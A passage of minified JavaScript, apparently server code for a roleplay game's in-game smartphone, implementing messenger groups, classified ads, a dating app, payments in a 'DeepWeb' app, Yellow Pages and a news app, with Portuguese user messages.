  if (i.anom_id == h || (await pK(g))) {
    rg.ads.splice(rg.ads.indexOf(i), 1);
    const k = {
      'TIPO': 'Remoção de anúncio'
    };
    k.ID = g, k.ANUNCIO = i.title, k.DESCRICAO = i.description, k.FOTO = i.image, k.PROPRIO = i.anom_id == h ? 'Sim' : 'Não';
    const l = {
      'name': 'DeepWeb'
    };
    l.content = k, qf(l);
  }
}, pL.tor_payments = async c => {
  const d = await vRP.getUserId(c),
    e = rg.getId(d);
  return rg.payments.where('sender', e).orWhere('target', e).orderBy('id', 'DESC').limit(50);
}, pL.tor_blocked = async c => {
  const d = await vRP.getUserId(c);

  if (await pE(d, pB.tor_blocked)) {
    return 'Você não pode acessar este aplicativo';
  }

  return false;
}, pL.tor_pay = async (f, g, h) => {
  const i = await vRP.getUserId(f),
    j = rg.getId(i),
    k = rg.users[g];

  if (!k) {
    const l = {
      'error': 'Usuário offline'
    };
    return l;
  } else {
    if (k == f) {
      const n = {
        'error': 'Você não pode transferir para si mesmo'
      };
      return n;
    } else {
      if (!Number.isInteger(h) || h <= 0) {
        const q = {
          'error': 'Valor inválido'
        };
        return q;
      }
    }
  }

  return qC(i, async () => {
    const r = await vRP.getBankMoney(i);

    if (r >= h) {
      await vRP.setBankMoney(i, r - h);
      const s = await vRP.getUserId(k);
      await qy(s, h), await rg.payments.insert({
        'sender': j,
        'target': g,
        'amount': h,
        'created_at': oT()
      });
      const t = pu(h),
        u = {};
      u.value = t, u.user = j, oS(k, 'TOR_NOTIFY', 'Você recebeu {value} de @{user}'.format(u));
      const v = {};
      v.value = t, v.user = j, oS(f, 'TOR_NOTIFY', 'Você enviou {value} para @{user}'.format(v));
      const w = {
        'TIPO': 'Pagamento'
      };
      w.ID = i + ' (' + j + ')', w.DESTINATARIO = s + ' (' + g + ')', w.VALOR = h;
      const x = {
        'name': 'DeepWeb'
      };
      x.content = w, qf(x);
    }
  });
};
const ri = {
  '__proto__': null
};
var rj = Object.freeze(ri);
const rk = {};
rk.groups = [];
const rl = {
  get 'profiles'() {
    return pc('smartphone_whatsapp');
  },

  get 'channels'() {
    return pc('smartphone_whatsapp_channels');
  },

  get 'messages'() {
    return pc('smartphone_whatsapp_messages');
  },

  get 'groups'() {
    return pc('smartphone_whatsapp_groups');
  },

  'cache': rk,
  'channelCache': {},

  'channelHash'(...c) {
    return GetHashKey(c.join(';'));
  },

  async 'getChannel'(d, e) {
    const f = this.channelHash(d, e);
    if (this.channelCache[f]) return this.channelCache[f];
    const g = await this.channels.whereIn('sender', [d, e]).whereIn('target', [d, e]).first();
    if (g) return this.channelCache[f] = g.id;
    const h = {};
    h.sender = d, h.target = e;
    const i = await this.channels.insert(h).returnKeys();
    return this.channelCache[f] = i;
  }

};
pA.on('whatsapp:updatePhoneNumber', async (i, j) => {
  const k = {};
  k.owner = i;
  const l = {};
  l.owner = j;
  await rl.profiles.where(k).update(l), rl.cache.groups.forEach(q => {
    if (q.owner == i) {
      q.owner = j, q.update(['owner']);
    } else {
      if (q.members.includes(i)) {
        q.members = q.members.map(s => s == i ? j : s), q.update(['members']);
      }
    }
  });
  const m = {};
  m.sender = i;
  const n = {};
  n.sender = j, await rl.channels.where(m).update(n);
  const o = {};
  o.target = i;
  const p = {};
  p.target = j, await rl.channels.where(o).update(p);
});

class rm {
  constructor({
    id: c,
    name: d,
    avatarURL: e,
    owner: f,
    members: g,
    created_at: h,
    message: i
  }) {
    this.id = c;
    this.name = d, this.avatarURL = e, this.owner = f;
    this.members = g, this.created_at = h, this.message = i;
  }

  get ['channelId']() {
    return 1000000000 + this.id;
  }

  ['getOnline']() {
    return [this.owner, ...this.members].map(c => pI[c]).filter(Number.isInteger);
  }

  ['pusher'](c, d) {
    this.getOnline().forEach(e => oS(e, c, d));
  }

  ['update'](d = []) {
    const e = {};

    for (let g of d) {
      e[g] = g === 'members' ? JSON.stringify(this.members) : this[g];
    }

    const f = {};
    return f.id = this.id, rl.groups.update(e).where(f).then(() => true);
  }

}

rm.MAX_MEMBERS = 100, pF.ready(async c => {
  const {
    profiles: d,
    channels: e,
    messages: f,
    groups: g
  } = rl;
  !c.includes(d.table) && (await d.create(i => {
    i.varchar('owner', 32).primary(), i.varchar('avatarURL').nullable(), i.tinyint('read_receipts').default(1);
  }));

  if (!c.includes(e.table)) {
    await e.create(i => {
      i.id(), i.varchar('sender', 50), i.varchar('target', 50);
    }), await e.createIndex('sender'), await e.createIndex('target');
  }

  if (!c.includes(f.table)) {
    await f.create(k => {
      k.id(), k.bigint('channel_id').unsigned(), k.varchar('sender', 50), k.varchar('image', 512).nullable(), k.varchar('location').nullable(), k.varchar('content', 500).nullable(), k.varchar('deleted_by').nullable(), k.tinyint('readed').default(0), k.bigint('saw_at').default(0), k.bigint('created_at');
    }), await f.createIndex('sender'), await f.createIndex('channel_id');
  } else {
    if (await pF.hasColumn(f.table, 'target')) {
      console.time('whatsapp_migration'), await pc.query('TRUNCATE ' + f.table), await pc.query('ALTER TABLE ' + f.table + ' DROP COLUMN target'), await pc.query('ALTER TABLE ' + f.table + ' ADD COLUMN channel_id BIGINT UNSIGNED NOT NULL AFTER id'), await f.createIndex('channel_id'), console.timeEnd('whatsapp_migration'), console.log('WhatsApp migration finished, restart the script if this took too long');
    }
  }

  if (!c.includes(g.table)) {
    await g.create(m => {
      m.id(), m.varchar('name'), m.varchar('avatarURL'), m.varchar('owner'), m.varchar('members', 2048), m.bigint('created_at');
    });
  } else {
    await pc.query('ALTER TABLE smartphone_whatsapp_groups MODIFY members VARCHAR(2048) NOT NULL');
    const m = [];

    for (let o of await rl.groups) {
      try {
        o.members = JSON.parse(o.members), m.push(o);
      } catch {
        console.log('O grupo ' + o.id + ' foi ignorado por erros de formatação');
      }
    }

    const n = await pc.query('select m1.* from smartphone_whatsapp_messages m1 \n      left outer join smartphone_whatsapp_messages m2 \n      on (m1.id<m2.id and m1.channel_id=m2.channel_id)\n      where m2.id is null AND m1.channel_id > 1000000000;');

    for (let s of m) {
      s.message = n.find(u => u.channel_id == s.id + 1000000000);
    }

    rl.cache.groups = m.map(u => new rm(u));
  }
});
const rn = p3(async (e, f) => {
  const g = await pF.getIdByPhone(e);
  const h = await pF.getIdByPhone(f);

  if (g && h) {
    const j = {};
    j.user_id = g, j.phone = f;
    const k = {};
    return k.user_id = h, k.phone = e, pF.phone_blocks.where(l => l.where(j)).orWhere(l => l.where(k)).exists();
  } else return false;
}, 10000);

pL.wpp_sendMessage = async (f, g, h, i = 'text', j = null) => {
  const k = await vRP.getUserId(f),
    l = pG[k],
    m = g.startsWith('group') && rl.cache.groups.find(p => p.id == g.substr(5));
  if (p0(f)) return {}; else {
    if (h.length > 255) {
      const p = {
        'error': 'Mensagem muito grande'
      };
      return p;
    } else {
      if (await rn(l, g)) {
        const s = {
          'error': 'Você não consegue enviar mensagem para este número'
        };
        return s;
      }
    }
  }
  let n = m ? m.channelId : await rl.getChannel(l, g),
    o = {
      'sender': l,
      'channel_id': n,
      'content': h,
      'created_at': oT()
    };

  if (i === 'image') {
    o.image = j;
  } else {
    if (i === 'location' && Array.isArray(j) && j.length === 3) {
      o.location = JSON.stringify(j);
    }
  }

  o.id = await rl.messages.insert(o).returnKeys();
  if (!o.id) return;
  emit('smartphone:whatsapp_message', o);

  if (m) {
    const v = {};
    v.id = m.id, v.name = m.name, o.group = v, m.pusher('WHATSAPP_MESSAGE', o);
  } else o.target = g, oS(f, 'WHATSAPP_MESSAGE', o), pP(g).then(y => {
    f != y && oS(y, 'WHATSAPP_MESSAGE', o);
  });

  return {};
};

const ro = p3((...c) => rl.profiles.whereIn('owner', c).where('read_receipts', 0).exists(), 10000);
pL.wpp_markAsRead = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = pG[h],
    j = await ro(g, i),
    k = await rl.getChannel(g, i);
  const l = {
    'readed': 0x0
  };
  l.sender = g, l.channel_id = k;
  const m = {
    'readed': 0x1
  };
  if (j) return void (await rl.messages.where(l).update(m));
  const n = {
    'saw_at': 0x0
  };
  n.sender = g, n.channel_id = k, await rl.messages.where(n).update({
    'saw_at': oT(),
    'readed': 0x1
  });
  const o = pH[g];

  if (o) {
    const q = await pM(o);
    q && oS(q, 'WHATSAPP_READ', i);
  }
}, pL.wpp_getProfile = async e => {
  const f = await vRP.getUserId(e),
    g = pG[f];
  const h = {};
  h.owner = g;
  let i = await rl.profiles.where(h).first();

  if (!i) {
    const j = {};
    j.owner = g, await rl.profiles.insert(i = j);
  }

  return i;
}, pL.wpp_updateAvatar = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = pG[h];
  const j = {};
  j.owner = i;
  const k = {};
  k.avatarURL = g, await rl.profiles.where(j).update(k);
  const l = {};
  l.phone = i, l.avatarURL = g, oS(-1, 'WHATSAPP_AVATAR', l);
}, exports('getWhatsappAvatar', d => {
  const e = {};
  return e.owner = d, rl.profiles.where(e).first().pluck('avatarURL');
}), pL.wpp_updateSettings = async (e, f) => {
  const g = await vRP.getUserId(e),
    h = pG[g],
    i = {};
  i.owner = h;
  const j = {};
  j.read_receipts = f, await rl.profiles.where(i).update(j);
}, pL.wpp_getResume = async f => {
  const g = await vRP.getUserId(f),
    h = pG[g],
    i = rl.cache.groups.filter(r => {
      return r.owner == h || r.members.includes(h);
    }),
    j = await pF.contacts.where('owner', h).pluck('phone'),
    k = await rl.profiles.whereIn('owner', j).pluck('avatarURL', 'owner'),
    l = {};
  l.sender = h;
  const m = {};
  m.target = h;
  const n = await rl.channels.where(l).orWhere(m),
    o = await pc.query('select m1.* from smartphone_whatsapp_messages m1 \n  left outer join smartphone_whatsapp_messages m2 \n  on (m1.id<m2.id and m1.channel_id=m2.channel_id)\n  left join smartphone_whatsapp_channels ch on ch.id=m1.channel_id\n  where m2.id is null AND (ch.sender=? or ch.target=?)\n  and (m1.deleted_by is null or m1.deleted_by!=?)', [h, h, h]);

  for (let r of o) {
    if (r.sender != h) {
      r.target = h;
    } else {
      const u = n.find(v => v.id == r.channel_id);
      r.target = u.sender == h ? u.target : u.sender;
    }
  }

  const p = (await pc.query('select channel_id,COUNT(*) as qtd from smartphone_whatsapp_messages msg\n  left join smartphone_whatsapp_channels ch on msg.channel_id=ch.id\n  where (ch.sender=? or ch.target=?) and msg.readed=0 and msg.sender!=?', [h, h, h])).pluckBy('qtd', 'channel_id'),
    q = {};
  return q.groups = i, q.messages = o, q.unread = p, q.avatars = k, q;
}, pL.wpp_getChat = async (i, j) => {
  const k = await vRP.getUserId(i);
  const l = pG[k];

  if (j.startsWith('group')) {
    const m = rl.cache.groups.find(q => q.id == j.slice(5));

    if (!m || m.owner != l && !m.members.includes(l)) {
      const r = {
        'error': 'Grupo não encontrado'
      };
      return r;
    }

    const n = {};
    n.channel_id = m.channelId;
    const o = await rl.messages.where(n).limit(125).orderBy('id', 'DESC');
    o.sort((s, t) => s.id - t.id);
    const p = {};
    return p.name = m.name, p.id = m.channelId, p.avatarURL = m.avatarURL, p.messages = o, p;
  } else {
    const u = await rl.getChannel(l, j),
      v = {};
    v.id = u;
    const w = v,
      x = {};
    x.channel_id = u, w.messages = (await rl.messages.where(z => {
      z.whereNull('deleted_by').orWhere('deleted_by', '!=', l);
    }).where(x).limit(125).orderBy('id', 'DESC')) || [], w.messages.sort((z, A) => z.id - A.id);
    const y = {};
    return y.owner = j, w.avatarURL = await rl.profiles.where(y).first().pluck('avatarURL'), w;
  }
}, pL.wpp_getAvatar = async (d, e) => {
  const f = {};
  return f.owner = e, rl.profiles.where(f).first().pluck('avatarURL');
}, pL.wpp_deleteMessages = async (c, d) => {
  const e = await vRP.getUserId(c);
  const f = pG[e],
    g = 'smartphone_whatsapp_messages';

  if (d && !d.startsWith('group')) {
    const h = await rl.getChannel(f, d);
    await pc.query('DELETE FROM ' + g + ' WHERE channel_id=?\n    AND deleted_by IS NOT NULL AND deleted_by != ?', [h, f]), await pc.query('UPDATE ' + g + ' SET deleted_by=? WHERE channel_id=?', [f, h]);
  } else {
    await pc.query('DELETE msg FROM ' + g + ' msg\n    LEFT JOIN smartphone_whatsapp_channels ch ON msg.channel_id=ch.id\n    WHERE (ch.sender = ? OR ch.target = ?)\n    AND deleted_by IS NOT NULL AND deleted_by != ?', [f, f, f]), await pc.query('UPDATE ' + g + ' msg\n    LEFT JOIN smartphone_whatsapp_channels ch ON msg.channel_id=ch.id\n    SET deleted_by=? WHERE (ch.sender = ? OR ch.target = ?)\n    AND deleted_by IS NULL', [f, f, f]);
  }

  return true;
}, pL.wpp_getGroup = async (f, g) => {
  const h = await vRP.getUserId(f);
  const i = pG[h],
    j = rl.cache.groups.find(k => k.id == g);

  if (!j) {
    const l = {
      'error': 'Grupo não encontrado'
    };
    return l;
  } else {
    if (j.owner === i || j.members.includes(i)) {
      const m = {
        ...j
      };
      return m.isOwner = j.owner === i, m;
    } else {
      const o = {
        'error': 'Você não é o dono do grupo'
      };
      return o;
    }
  }
}, pL.wpp_promote = async (e, f, g) => {
  const h = await vRP.getUserId(e),
    j = pG[h];
  const k = rl.cache.groups.find(l => l.id == f);

  if (k.owner === j) {
    const m = k.members.indexOf(g);

    if (m >= 0) {
      k.members.splice(m, 1, j), k.owner = g, k.update(['owner', 'members']);
    } else {
      const p = {
        'error': 'Este número não faz parte do grupo'
      };
      return p;
    }
  } else {
    const q = {
      'error': 'Sem permissão'
    };
    return q;
  }
}, pL.wpp_inviteToGroup = async (h, i, j) => {
  const k = await vRP.getUserId(h),
    l = pG[k],
    m = rl.cache.groups.find(n => n.id == i);

  if (!m) {
    const n = {
      'error': 'Grupo não encontrado'
    };
    return n;
  } else {
    if (m.owner === l) {
      if (m.members.includes(j)) {
        const p = {
          'error': 'Este número já está no grupo'
        };
        return p;
      } else {
        if (m.members.length >= rm.MAX_MEMBERS - 1) {
          const s = {
            'error': 'O grupo está cheio'
          };
          return s;
        } else {
          if (!(await pF.getIdentityByPhone(j))) {
            const t = {
              'error': 'Número não encontrado'
            };
            return t;
          } else {
            m.members.push(j), m.update(['members']);
            const w = pI[j];
            if (w) oS(w, 'WHATSAPP_GROUP', m);
          }
        }
      }
    } else {
      const z = {
        'error': 'Você não é o dono do grupo'
      };
      return z;
    }
  }
}, pL.wpp_removeFromGroup = async (g, h, i) => {
  const j = await vRP.getUserId(g);
  const k = pG[j];
  const l = rl.cache.groups.find(m => m.id == h);

  if (!l) {
    const m = {
      'error': 'Grupo não encontrado'
    };
    return m;
  } else {
    if (l.owner === k) {
      let o = l.members.indexOf(i);

      if (o === -1) {
        const q = {
          'error': 'Este número não faz parte do grupo'
        };
        return q;
      } else {
        l.members.splice(o, 1), l.update(['members']);
        const s = pI[i],
          t = {};
        t.id = l.id, t.name = l.name;
        if (s) oS(s, 'WHATSAPP_GROUP_KICK', t);
      }
    } else {
      const w = {
        'error': 'Você não é o dono do grupo'
      };
      return w;
    }
  }
}, pL.wpp_leaveGroup = async (f, g) => {
  const h = await vRP.getUserId(f),
    i = pG[h],
    j = rl.cache.groups.find(k => k.id == g);

  if (!j) {
    const l = {
      'error': 'Grupo não encontrado'
    };
    return l;
  } else {
    if (j.owner === i) {
      const n = {
        'error': 'Você não pode sair do grupo sendo dono'
      };
      return n;
    } else {
      if (j.members.includes(i)) {
        const o = j.members.indexOf(i);
        j.members.splice(o, 1), j.update(['members']), oS(f, 'WHATSAPP_LEAVE_GROUP', j.id);
      } else {
        const q = {
          'error': 'Você não é o dono do grupo'
        };
        return q;
      }
    }
  }
}, pL.wpp_createGroup = async (c, d, e, f) => {
  const g = await vRP.getUserId(c),
    h = pG[g],
    i = {
      'name': d,
      'owner': h,
      'avatarURL': e,
      'members': JSON.stringify(f),
      'created_at': oT()
    };
  i.id = await rl.groups.insert(i).returnKeys();
  if (!i.id) return;
  i.members = f;
  const j = new rm(i);
  rl.cache.groups.push(j);
  j.pusher('WHATSAPP_GROUP', j);
}, pL.wpp_updateGroupAvatar = async (f, g, h) => {
  const i = await vRP.getUserId(f),
    j = pG[i],
    k = rl.cache.groups.find(l => l.id === g);

  if (!k) {
    const m = {
      'error': 'Grupo não encontrado'
    };
    return m;
  } else {
    if (k.owner != j) {
      const o = {
        'error': 'Você não é o dono do grupo'
      };
      return o;
    } else {
      k.avatarURL = h, k.update(['avatarURL']);
      const p = {};
      p.id = g, p.avatarURL = h, k.pusher('WHATSAPP_GROUP_PHOTO', p);
    }
  }
}, pL.wpp_updateGroupName = async (f, g, h) => {
  const i = await vRP.getUserId(f),
    j = pG[i];
  const k = rl.cache.groups.find(l => l.id === g);

  if (!k) {
    const m = {
      'error': 'Grupo não encontrado'
    };
    return m;
  } else {
    if (k.owner != j) {
      const n = {
        'error': 'Você não é o dono do grupo'
      };
      return n;
    } else {
      k.name = h, k.update(['name']);
      const p = {};
      p.id = g, p.name = h, k.pusher('WHATSAPP_GROUP_NAME', p);
    }
  }
}, pL.wpp_deleteGroup = async (g, h) => {
  const i = await vRP.getUserId(g);
  const j = pG[i],
    k = rl.cache.groups.find(l => l.id == h);

  if (!k) {
    const l = {
      'error': 'Grupo não encontrado'
    };
    return l;
  } else {
    if (k.owner != j) {
      const n = {
        'error': 'Você não é o dono do grupo'
      };
      return n;
    } else {
      const p = {};
      p.id = h, await rl.groups.where(p).delete();
      const q = {};
      q.channel_id = k.channelId, await rl.messages.where(q).delete(), k.pusher('WHATSAPP_GROUP_DESTROY', {
        'id': k.id,
        'name': k.name
      });
      const r = rl.cache.groups.indexOf(k);
      rl.cache.groups.splice(r, 1);
    }
  }
};
const rp = {
  '__proto__': null
};
var rq = Object.freeze(rp);
const rr = {
  get 'ads'() {
    return pc('smartphone_olx');
  }

};
pF.ready(async c => {
  if (!c.includes(rr.ads.table)) {
    await rr.ads.create(e => {
      e.id(), e.int('user_id'), e.varchar('title'), e.varchar('category'), e.int('price'), e.varchar('description', 1024), e.varchar('images', 1024), e.bigint('created_at');
    }), await rr.ads.createIndex('user_id');
  }
}), pL.olx_search = async (c, d, e) => {
  const f = await rr.ads.where('title', 'LIKE', d).where('category', 'LIKE', e).orderBy('id', 'DESC').limit(50);
  const g = await pF.getIdentitiesBy('user_id', f.pluck('user_id').unique());

  for (let h of f) {
    h.images = JSON.parse(h.images), h.author = g.find(i => i.user_id == h.user_id);
  }

  return f;
}, pL.olx_fetch = async (d, e) => {
  const f = {};
  f.id = e;
  const g = await rr.ads.where(f).first();
  g && (g.images = JSON.parse(g.images));
  return g && (g.author = await pF.getIdentityByUserId(g.user_id)), g;
}, pL.olx_createAd = async (i, j) => {
  const k = await vRP.getUserId(i);
  if (p0(i, 'olx', 1)) return;
  const l = {
    'error': 'Título inválido'
  };
  if (!j.title || j.title.length > 1024) return l;
  const m = {
    'error': 'A categoria é obrigatória'
  };
  if (!j.category) return m;
  const n = {
    'error': 'A descrição é obrigatória'
  };
  if (!j.description) return n;
  const o = {
    'error': 'Valor inválido'
  };
  if (!Number.isInteger(j.price) || j.price <= 0) return o;
  const p = {
    'error': 'A imagem é obrigatória'
  };
  if (!Array.isArray(j.images) || j.images.length == 0) return p;
  const q = {
    'error': 'O máximo de imagens é 3'
  };
  if (j.images.length > 3) return q;
  delete j.id;
  return j.user_id = k, j.images = JSON.stringify(j.images), j.created_at = oT(), j.id = await rr.ads.insert(j), j;
}, pL.olx_dashboard = async d => {
  const e = await vRP.getUserId(d);
  const f = {};
  f.user_id = e;
  const g = await rr.ads.where(f).limit(50);
  return g.forEach(h => h.images = JSON.parse(h.images)), g;
}, pL.olx_destroy = async (g, h) => {
  const i = await vRP.getUserId(g),
    j = {
      'error': '?'
    };
  if (!h) return j;
  const k = await rr.ads.where('id', h).first();

  if (k && (k.user_id == i || (await pK(i)))) {
    pz.deleteManyImages(...JSON.parse(k.images));
    const m = {};
    m.id = h, await rr.ads.where(m).delete();
    const n = {};
    n.ID = i, n.ANUNCIO = k.title, n['ID DO ANUNCIO'] = k.id, n['DONO DO ANUNCIO'] = k.user_id;
    const o = {
      'name': 'OLX'
    };
    o.content = n, qf(o);
  }
};
const rs = {
  '__proto__': null
};
var rt = Object.freeze(rs);
const ru = {
  get 'profiles'() {
    return pc('smartphone_tinder');
  },

  get 'rating'() {
    return pc('smartphone_tinder_rating');
  },

  get 'messages'() {
    return pc('smartphone_tinder_messages');
  },

  'users': {}
};
pF.ready(async c => {
  const {
    profiles: d,
    rating: e,
    messages: f
  } = ru;
  !c.includes(d.table) && (await d.create(h => {
    h.id(), h.int('user_id'), h.varchar('name'), h.varchar('image'), h.varchar('bio', 1024), h.tinyint('age'), h.varchar('gender', 50), h.tinyint('show_gender'), h.varchar('tags'), h.tinyint('show_tags'), h.varchar('target', 100);
  }), await d.createIndex('user_id'), await d.createIndex('gender'), await d.createIndex('target'));
  !c.includes(e.table) && (await e.create(h => {
    h.int('profile_id').primary(), h.int('rated_id').primary(), h.tinyint('rating').default(0);
  }));
  !c.includes(f.table) && (await f.create(j => {
    j.id(), j.int('sender'), j.int('target'), j.varchar('content'), j.tinyint('liked').default(0), j.bigint('created_at');
  }), await f.createIndex('sender'), await f.createIndex('target'));
});

function rv(c) {
  for (let d in ru.users) {
    if (ru.users[d] && ru.users[d].id == c) {
      return pM(parseInt(d));
    }
  }

  return Promise.resolve();
}

function rw(c) {
  const d = c.target == 'All' ? ['Male', 'Female'] : [c.target];
  return ru.profiles.whereIn('gender', d).whereIn('target', ['All', c.gender]).where('id', '!=', c.id);
}

pL.tinder = async d => {
  const e = await vRP.getUserId(d),
    f = {};
  f.user_id = e;
  const g = await ru.profiles.where(f).first();
  ru.users[e] = g;
  return g && ry.modify([g.id], () => g), g;
}, pL.tinder_register = async (c, d) => {
  const e = await vRP.getUserId(c);
  delete d.id;
  d.user_id = e;
  d.tags = JSON.stringify(d.tags), await ru.profiles.insert(d);
}, pL.tinder_changeAvatar = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = {};
  g.image = e;
  await ru.profiles.where('user_id', f).update(g);
}, pL.tinder_changeBio = async (d, e) => {
  if (!e || e.length > 1024) return;
  const f = await vRP.getUserId(d),
    g = {};
  g.bio = e;
  await ru.profiles.where('user_id', f).update(g);
}, pL.tinder_changeTarget = async (d, e) => {
  const f = await vRP.getUserId(d);
  const g = {};
  g.target = e, await ru.profiles.where('user_id', f).update(g);
}, pL.tinder_next = async (i, j, k, l) => {
  const m = await vRP.getUserId(i),
    n = ru.users[m];
  if (!n) return;
  const o = await ru.rating.where('profile_id', n.id).select('rated_id', 'rating'),
    p = o.filter(s => s.rating != 0).pluck('rated_id');
  const q = rw(n);
  let r;

  if (j === 0) {
    r = await q.whereNotIn('id', o.pluck('rated_id')).first();
  } else {
    if (k) {
      const u = {};
      u.profile_id = n.id, u.rated_id = j, u.rating = l, await ru.rating.replace(u);
      const v = {};
      v.profile_id = j, v.rated_id = n.id;

      if (l != 0 && (await ru.rating.where(v).where('rating', '>', 0).exists())) {
        const x = await ry(j);

        if (x) {
          const y = {};
          y.name = x.name;
          const z = {};
          z.profile = y, oS(i, 'TINDER_MATCH', z), rx.modify([x.id], D => D && D.push(n) && D);
          const A = await pP(x.user_id),
            B = {};
          B.name = n.name;
          const C = {};
          C.profile = B, A && oS(A, 'TINDER_MATCH', C);
        }
      }

      r = await q.where('id', '>', j).whereNotIn('id', p).first();
    } else {
      r = await q.where('id', '<', j).whereNotIn('id', p).orderBy('id', 'DESC').first();
    }
  }

  if (r) {
    r.tags = JSON.parse(r.tags), r.online = Number.isInteger(await pM(r.user_id)), r.previous = await rw(n).where('id', '<', r.id).whereNotIn('id', p).exists();
  }

  return r;
}, pL.tinder_liked = p3(async c => {
  const d = await vRP.getUserId(c);
  const e = ru.users[d];
  if (!e) return [];
  const f = await ru.rating.where('rated_id', e.id).where('rating', '>', 0).pluck('profile_id'),
    g = await ru.profiles.whereIn('id', f);
  return g;
}, 15000);
const rx = p3(async d => {
  const e = await ru.rating.where('profile_id', d).where('rating', '>', 0).pluck('rated_id'),
    f = await ru.rating.where('rated_id', d).where('rating', '>', 0).pluck('profile_id'),
    g = e.filter(l => f.includes(l)),
    h = await ru.profiles.whereIn('id', g),
    i = {};
  i.sender = d;
  i.target = d;
  const j = await ru.messages.select(pc.raw('MAX(id) as id')).where(l => l.orWhere(i)).groupBy('sender', 'target').pluck('id'),
    k = (await ru.messages.whereIn('id', j)).filter((l, m, n) => {
      const p = n.find(q => q.sender == l.target && q.target == l.sender);
      return !p || p.id < l.id;
    });

  for (let l of h) {
    l.last_message = k.find(n => n.sender == d && n.target == l.id || n.sender == l.id && n.target == d);
  }

  return h;
}, 60000);

pL.tinder_matches = async c => {
  const d = await vRP.getUserId(c);
  const e = ru.users[d];
  return e && rx(e.id);
};

const ry = p3(c => {
  for (let d of Object.values(ru.users)) {
    if (d && d.id == c) return d;
  }

  return ru.profiles.where('id', c).first();
}, 30000);
pL.tinder_chat = async (e, f) => {
  const g = await vRP.getUserId(e),
    h = ru.users[g],
    i = await ry(f);

  if (!h || !i) {
    return;
  }

  const j = h.id;
  i.avatars = {
    [h.id]: h.image,
    [i.id]: i.image
  };
  const k = {};
  k.sender = j, k.target = f;
  const l = {};
  l.sender = f;
  return l.target = j, i.messages = await ru.messages.where(n => n.where(k)).orWhere(n => n.where(l)).orderBy('id', 'DESC').limit(100), i.messages.sort((n, o) => n.id - o.id), i;
}, pL.tinder_dismatch = async (f, g) => {
  const h = await vRP.getUserId(f);
  const i = ru.users[h];

  if (!i) {
    return;
  }

  const j = {
    'rating': 0x0
  };
  j.profile_id = i.id, j.rated_id = g, await ru.rating.replace(j);
  const k = {};
  k.sender = i.id, k.target = g;
  const l = {};
  l.sender = g, l.target = i.id, await ru.messages.where(o => o.where(k)).orWhere(o => o.where(l)).delete();
  const m = await rv(g);
  m && oS(m, 'TINDER_DISMATCH', i.id);
}, pL.tinder_delete = async c => {
  const d = await vRP.getUserId(c);
  const e = ru.users[d];

  if (e) {
    await ru.messages.where('sender', e.id).orWhere('target', e.id).delete(), await ru.rating.where('profile_id', e.id).orWhere('rated_id', e.id).delete(), await ru.profiles.destroy(e.id), delete ru.users[d];
  }
}, pL.tinder_sendMessage = async (c, d, e) => {
  const f = await vRP.getUserId(c),
    g = ru.users[f];
  if (p0(c) || !g) return;
  const h = await ry(d);
  if (!h) return;
  const i = {
    'sender': g.id,
    'target': d,
    'content': e,
    'created_at': oT()
  };
  i.id = await ru.messages.insert(i).returnKeys();
  if (!i.id) return;
  i.sender_name = g.name, i.sender_uid = f, oS(c, 'TINDER_MESSAGE', i);
  const j = [g.id, h.id];
  j.forEach(l => rx.modify([l], m => {
    return m && m.forEach(o => {
      if (j.includes(o.id)) {
        o.last_message = i, o.image = o.id == h.id ? h.image : g.image;
      }
    }), m;
  }));
  const k = await pP(h.user_id);
  k && oS(k, 'TINDER_MESSAGE', i);
}, pL.tinder_likeMessage = async (d, e) => {
  const f = await vRP.getUserId(d),
    g = ru.users[f];

  if (!g) {
    return;
  }

  const h = await ru.messages.where('id', e).where('target', g.id).first();
  if (!h) return;
  const i = {
    'liked': 0x1
  };
  await ru.messages.where('id', e).update(i), oS(d, 'TINDER_LIKE', e);
  const j = await rv(h.sender);
  j && oS(j, 'TINDER_LIKE', e);
}, on('vRP:playerLeave', c => delete ru.users[c]);
const rz = {
  '__proto__': null
};
var rA = Object.freeze(rz);
const rB = [];
pL.yellowpages_index = () => rB, pL.yellowpages_store = async (e, f) => {
  const g = await vRP.getUserId(e);
  const h = pG[g];

  if (f && f.length <= 100) {
    const i = rB.find(j => j.author.user_id == g);
    if (i) i.title = f, global.emit('smartphone:yellowpages-update', i); else {
      const l = await pF.getName(g),
        m = {};
      m.user_id = g, m.name = l, m.phone = h;
      const n = {};
      n.author = m, n.title = f;
      const o = n;
      rB.unshift(o), global.emit('smartphone:yellowpages', o);
    }
  }
}, pL.yellowpages_destroy = async c => {
  const d = await vRP.getUserId(c),
    e = rB.findIndex(f => f.author.user_id == d);
  e >= 0 && rB.splice(e, 1);
  global.emit('smartphone:yellowpages-destroy', d);
}, on('vRP:playerLeave', c => {
  const d = rB.findIndex(e => e.author.user_id == c);
  d >= 0 && rB.splice(d, 1);
});
const rC = {
  '__proto__': null
};
var rD = Object.freeze(rC);

function rE() {
  return pc('smartphone_weazel');
}

const rF = {};
pF.ready(async c => {
  if (!pB.exclusive || !pB.exclusive.weazel || !pF['💀']) {
    if (pB.client.disabledApps) {
      pB.client.disabledApps.push('weazel');
    } else {
      pB.client.disabledApps = ['weazel'];
    }
    return;
  }

  if (!c.includes('smartphone_weazel')) {
    await rE().create(h => {
      h.id(), h.int('user_id'), h.varchar('author'), h.varchar('tag'), h.varchar('title'), h.varchar('description', 4096), h.varchar('imageURL').nullable(), h.varchar('videoURL').nullable(), h.int('views').default(0), h.int('created_at');
    });
  }

  Object.assign(pL, rF);
});
const rG = ['author', 'tag', 'title', 'description', 'imageURL', 'videoURL'];

async function rH(c, d) {
  if (!(await pE(c, pB.exclusive?.['weazel']?.['permission']))) {
    throw new p8('Sem permissão');
  } else {
    if (!d.author) {
      throw new p8('Insira o nome do Autor');
    } else {
      if (!d.title) {
        throw new p8('Insira o título da notícia');
      } else {
        if (!d.description) {
          throw new p8('Insira a descrição da notícia');
        } else {
          if (!d.tag) {
            throw new p8('Insira a categoria da notícia');
          }
        }
      }
    }
  }

  return oW(d, ...rG);
}

rF.weazel_index = () => rE().orderBy('created_at', 'DESC').limit(20), rF.weazel_tag = (c, d) => rE().where('tag', String(d)).orderBy('created_at', 'DESC').limit(20), rF.weazel_publish = async (c, d) => {
  const e = await vRP.getUserId(c);
  const f = await rH(e, d);
  f.user_id = e, f.views = 0, f.created_at = oT(), f.id = await rE().insert(f).returnKeys(), global.emit('smartphone:weazel', f);
